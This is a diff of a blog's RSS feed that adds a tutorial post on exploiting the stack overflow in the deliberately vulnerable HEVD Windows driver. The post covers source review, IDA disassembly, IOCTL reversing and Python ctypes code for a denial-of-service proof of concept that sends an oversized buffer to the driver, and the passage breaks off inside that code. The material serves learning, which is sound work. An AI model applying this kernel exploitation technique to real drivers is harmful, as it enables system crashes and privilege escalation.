@@ -6,9 +6,324 @@
 </description>
     <link>https://sizzop.github.io/</link>
     <atom:link href="https://sizzop.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 05 Jul 2016 21:56:27 -0400</pubDate>
-    <lastBuildDate>Tue, 05 Jul 2016 21:56:27 -0400</lastBuildDate>
+    <pubDate>Wed, 06 Jul 2016 15:26:38 -0400</pubDate>
+    <lastBuildDate>Wed, 06 Jul 2016 15:26:38 -0400</lastBuildDate>
     <generator>Jekyll v3.1.6</generator>
+    
+      <item>
+        <title>Kernel Hacking With HEVD Part 2 - The Bug</title>
+        <description>&lt;p&gt;Now that you have your &lt;a href=&quot;http://localhost:4000/2016/07/05/kernel-hacking-with-hevd-part-1.html&quot;&gt;debugging environment&lt;/a&gt; set up, it’s time to get to the fun part – the exploit! The &lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver&quot;&gt;Hacksys Extreme Vulnerable Driver&lt;/a&gt; has a lot of interesting bugs to play with. My purpose in using this driver is to get familiar with ring 0 payloads more so than the actual vulnerability exploitation so I chose to stick with the easy stack overflow so I could focus on payload. Lets first take a look at the actual vulnerability.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-bug-source-code-review&quot;&gt;The Bug (Source Code Review)&lt;/h3&gt;
+&lt;p&gt;Since we have the source code available to us, we’ll take the easy route first and just look at what’s going on.&lt;/p&gt;
+
+&lt;p&gt;If you haven’t worked with Windows drivers before, here’s some vastly over-simplified background info. User-mode code calls into the driver with the &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216(v=vs.85).aspx&quot;&gt;DeviceIoControl&lt;/a&gt; API in Kernel32.dll. The user-mode code provides a handle to the device with which it wants to interact (e.g. “HacksysExtremeVulnerableDriver”), an I/O control code (IOCTL) which basically tells the driver what function you want it to perform (again, grossly over-simplified; more on this later), and input and output buffers. The driver is passed an interrupt request packet (IRP) with all these particulars and passes the info along to a corresponding IOCTL handler routine.&lt;/p&gt;
+
+&lt;p&gt;The IOCTL dispatch function for HEVD is implemented as a switch/case in the IrpDeviceIoCtlHandler() function in HackSysExtremeVulnerableDriver.c:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IrpSp = IoGetCurrentIrpStackLocation(Irp);
+IoControlCode = IrpSp-&amp;gt;Parameters.DeviceIoControl.IoControlCode;
+
+if (IrpSp) {
+    switch (IoControlCode) {
+        case HACKSYS_EVD_IOCTL_STACK_OVERFLOW:
+            DbgPrint(&quot;****** HACKSYS_EVD_STACKOVERFLOW ******\n&quot;);
+            Status = StackOverflowIoctlHandler(Irp, IrpSp);
+            DbgPrint(&quot;****** HACKSYS_EVD_STACKOVERFLOW ******\n&quot;);
+            break;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;As you can see the IRP and the stack pointer are passed to StackOverflowIoctlHandler() which is implemented in StackOverflow.c, a snippet of which appears below. The Size parameter is simply the length of the input that the user-mode code supplied.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NTSTATUS StackOverflowIoctlHandler(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
+    UserBuffer = IrpSp-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer;
+    Size = IrpSp-&amp;gt;Parameters.DeviceIoControl.InputBufferLength;
+
+    if (UserBuffer) {
+        Status = TriggerStackOverflow(UserBuffer, Size);
+    }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The TriggerStackOverflow() function finally does the deed by copying UserBuffer into KernelBuffer without first checking to make sure the size of UserBuffer is &amp;lt;= KernelBuffer:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DbgPrint(&quot;[+] Triggering Stack Overflow\n&quot;);
+
+RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;the-bug-reverse-engineering&quot;&gt;The Bug (Reverse Engineering)&lt;/h3&gt;
+&lt;p&gt;Since we don’t always have the luxury of reviewing the source code of a driver, let’s take a look at a disassembly of the driver to see what this looks like. This is a bit easier than many real-world situations because of the helpful plain-text debug strings in the code and the fact that I’m using debugging symbols for the driver (the .pdb file in the Visual Studio project directory).&lt;/p&gt;
+
+&lt;p&gt;If you’ve done much reversing it’s easy enough to recognize the IrpDeviceIoCtlHandler() switch table in an IDA flow chart:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hevd2-ss1.jpg&quot; alt=&quot;IDA Flow Chart&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is where the driver is comparing the IOCTL in the IRP to the IOCTLs that it knows about so it can call the appropriate handler function. Once it finds the matching IOCTL, it calls the associated handler:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PAGE:FFFFF880037281D3 loc_FFFFF880037281D3:                   ; CODE XREF: IrpDeviceIoCtlHandler+31j
+PAGE:FFFFF880037281D3           lea     rcx, aHacksys_evd_st ; &quot;****** HACKSYS_EVD_STACKOVERFLOW ******&quot;...
+PAGE:FFFFF880037281DA           call    DbgPrint
+PAGE:FFFFF880037281DF           mov     rdx, rdi        ; IrpSp
+PAGE:FFFFF880037281E2           mov     rcx, rbx        ; Irp
+PAGE:FFFFF880037281E5           call    StackOverflowIoctlHandler
+PAGE:FFFFF880037281EA           lea     rcx, aHacksys_evd_st ; &quot;****** HACKSYS_EVD_STACKOVERFLOW ******&quot;...
+PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;As we saw in the source code, StackOverflowIoctlHandler() is a pretty small function that basically just calls TriggerStackOverflow() which looks like this in IDA:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hevd2-ss2.jpg&quot; alt=&quot;TriggerStackOverflow&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can see in the call to memset that the function is expecting a buffer of 0x800 (2048) bytes. So with this information, it looks like we’ve got enough to start playing with the vulnerability and see if we can’t get a controlled RIP overwrite.&lt;/p&gt;
+
+&lt;h3 id=&quot;dos-poc&quot;&gt;DoS PoC&lt;/h3&gt;
+&lt;p&gt;My other goal in doing this challenge is to get more familiar with &lt;a href=&quot;https://docs.python.org/2/library/ctypes.html&quot;&gt;Python ctypes&lt;/a&gt;. Why? Well because I like Python and because I’m taking the &lt;a href=&quot;https://www.offensive-security.com/information-security-training/advanced-windows-exploitation/&quot;&gt;OffSec AWE&lt;/a&gt; course at BlackHat this year and they teach ctypes so I figured I should get to know it better.&lt;/p&gt;
+
+&lt;p&gt;So first step in writing any exploit is to map out the steps we need to take. This should be simple for a DoS so here’s the outline:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+  &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
+  &lt;li&gt;Create a buffer with &amp;gt;2,048 bytes of data&lt;/li&gt;
+  &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;step-one---get-a-handle&quot;&gt;Step one - get a handle&lt;/h4&gt;
+&lt;p&gt;To get a handle to the device we need to use the &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx&quot;&gt;CreateFile&lt;/a&gt; API in Kernel32.dll. As MSDN says, this function “Creates or opens a file or I/O device. … The function returns a handle that can be used to access the file or device for various types of I/O depending on the file or device and the flags and attributes specified.” The function prototype is pretty straightforward and doesn’t require any special structures so we can go ahead and recreate it in Python pretty easily. Each of the parameters are documented in the MSDN article. I took the hex values for each constant (GENERIC_READ, etc.) and defined that at the top of my Python script and then created a function that calls the API and returns a handle to the device (mind the Unicode!):&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;gethandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Open handle to driver and return it&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*]Getting device handle...&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;u&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;HacksysExtremeVulnerableDriver&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dwDesiredAccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GENERIC_READ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dwShareMode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpSecurityAttributes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dwCreationDisposition&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OPEN_EXISTING&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dwFlagsAndAttributes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILE_ATTRIBUTE_NORMAL&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;hTemplateFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;windll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CreateFileW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                        &lt;span class=&quot;n&quot;&gt;dwDesiredAccess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                        &lt;span class=&quot;n&quot;&gt;dwShareMode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                        &lt;span class=&quot;n&quot;&gt;lpSecurityAttributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                        &lt;span class=&quot;n&quot;&gt;dwCreationDisposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                        &lt;span class=&quot;n&quot;&gt;dwFlagsAndAttributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                        &lt;span class=&quot;n&quot;&gt;hTemplateFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[-]Error getting device handle: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FormatError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]Got device handle: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;easy peasy.&lt;/p&gt;
+
+&lt;h4 id=&quot;step-two---get-the-ioctl&quot;&gt;Step two - get the IOCTL&lt;/h4&gt;
+&lt;p&gt;IOCTLs are actually made up of four components - the device type, a function code, the I/O method, and the allowed access. This is all explained in &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/hardware/ff543023(v=vs.85).aspx&quot;&gt;this MSDN article&lt;/a&gt; as well as the Windows chapter in &lt;a href=&quot;https://www.amazon.com/Guide-Kernel-Exploitation-Attacking-Core/dp/1597494860&quot;&gt;&lt;em&gt;Guide to Kernel Exploitation&lt;/em&gt;&lt;/a&gt; among other places. The driver developer generally uses some pre-defined constants to specify these inputs except for the function code which is a hex value which can be more or less arbitrary as long as it’s above 0x7FF for 3rd party drivers. The WDK gives developers a macro to use to define these IOCTLs and you can see in HackSysExtremeVulnerableDriver.h that it is used here as well:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This macro is explained a bit more &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/ms902086.aspx&quot;&gt;here&lt;/a&gt;. If I were writing my exploit in C I could just use the same macro but since I chose Python I have to either reimplement the macro in my script, or else just simply hard-code the IOCTL. I chose the reimplementation route since I was kind of interested in this whole IOCTL thing and because I can just copy/paste this into future exploits. After a bit of research, this is what I came up with:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ctl_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+             &lt;span class=&quot;n&quot;&gt;devicetype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILE_DEVICE_UNKNOWN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+             &lt;span class=&quot;n&quot;&gt;access&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILE_ANY_ACCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+             &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;METHOD_NEITHER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Recreate CTL_CODE macro to generate driver IOCTL&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;devicetype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Notice that I specify some common (I guess?) defaults for three of the inputs and only require the function code. This can then be called from my exploit code easily enough:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;ioctl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctl_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;If you’re curious you can just run the macro manually to see what the IOCTL looks like:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; ioctl = ((0x00000022 &amp;lt;&amp;lt; 16) | (0x00000000 &amp;lt;&amp;lt; 14) | (0x800 &amp;lt;&amp;lt; 2) | 0x00000003)
+&amp;gt;&amp;gt;&amp;gt; hex(ioctl)
+&#39;0x222003&#39;
+&amp;gt;&amp;gt;&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;sidebar---reversing-ioctls&quot;&gt;Sidebar - reversing IOCTLs&lt;/h4&gt;
+&lt;p&gt;The studious reader may be thinking “that’s all well and good if you have the source code and can see how the IOCTL is generated, but what about real life?” Indeed this is simpler than finding the IOCTLs in a closed-source driver and reversing the IOCTLs isn’t always very straightforward. Aside from using a tool like &lt;a href=&quot;https://github.com/N3mes1s/ioctlbf&quot;&gt;ioctlbf&lt;/a&gt; to bruteforce valid IOCTLs, you’ll usually have to resort to reversing the IOCTLs out of closed-source drivers before you can interact with them. Let’s take a closer look back at the switch table in HEVD’s IOCTL dispatch function which we saw briefly earlier.&lt;/p&gt;
+
+&lt;p&gt;IrpDeviceIoCtlHandler() starts by loading a hard-coded starting value (0x22201B) into eax and doing some math to figure out which side of the switch table to start from:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hevd2-ss3.jpg&quot; alt=&quot;IrpDeviceIoCtlHandler&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In our case the IOCTL we specified (0x222003) does not cause the execution to branch to the other half of the table (&lt;code class=&quot;highlighter-rouge&quot;&gt;ja&lt;/code&gt; = “jump if above”; our IOCTL is less than, or “below”, 0x22201B). The driver then subtracts it’s next guess, which happens to be the one we specified, from the provided IOCTL and if the result is zero (i.e. they match) then it branches to the StackOverflowIoctlHandler() block:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hevd2-ss4.jpg&quot; alt=&quot;IOCTL Found&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Notice that if we had specified another IOCTL, it would have kept subtracting 4 from the IOCTL to find a match or else return an error.&lt;/p&gt;
+
+&lt;p&gt;There is a lot more that can be said about reversing IOCTLs and maybe that would be a good blog post for another time, but hopefully this at least gives you some ideas to start with when trying to find IOCTLs in closed-source drivers. The driver has to compare the supplied IOCTL with the IOCTLs that it knows how to handle at some point so look for that.&lt;/p&gt;
+
+&lt;h4 id=&quot;step-three---create-the-buffer&quot;&gt;Step three - create the buffer&lt;/h4&gt;
+&lt;p&gt;This step turns out to be pretty straightforward in Python. Ctypes gives us the &lt;a href=&quot;https://docs.python.org/2/library/ctypes.html#ctypes.create_string_buffer&quot;&gt;create_string_buffer()&lt;/a&gt; function which suits our needs perfectly. We saw before that the vulnerable function is expecting a buffer of 2,048 bytes. It is safe to assume that we will not need too much more than that in order to overwrite RIP. With this in mind, I like to break out my buffer into recognizable units so I can see where certain variables are being overwritten. I’ll start with this buffer:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;evilbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;D&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This should let us know where we stand when we trigger the bug and we can adjust as necessary.&lt;/p&gt;
+
+&lt;h4 id=&quot;step-four---trigger-the-bug&quot;&gt;Step four - trigger the bug&lt;/h4&gt;
+&lt;p&gt;As mentioned previously we now need to put everything together and use the &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216(v=vs.85).aspx&quot;&gt;DeviceIoControl function&lt;/a&gt; to trigger the bug. Again the MSDN page gives us the function prototype and explains all of the parameters necessary. We will give it the handle that we retrieved, the IOCTL that we generated, a pointer to our evil buffer as well as it’s size, and everything else is just null. My code looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwIoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Create evil buf and send IOCTL&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;evilbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;D&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpInBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addressof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evilbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;nInBufferSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evilbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpOutBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;nOutBufferSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpBytesReturned&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpOverlapped&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;pwnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;windll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                           &lt;span class=&quot;n&quot;&gt;dwIoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                           &lt;span class=&quot;n&quot;&gt;lpInBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
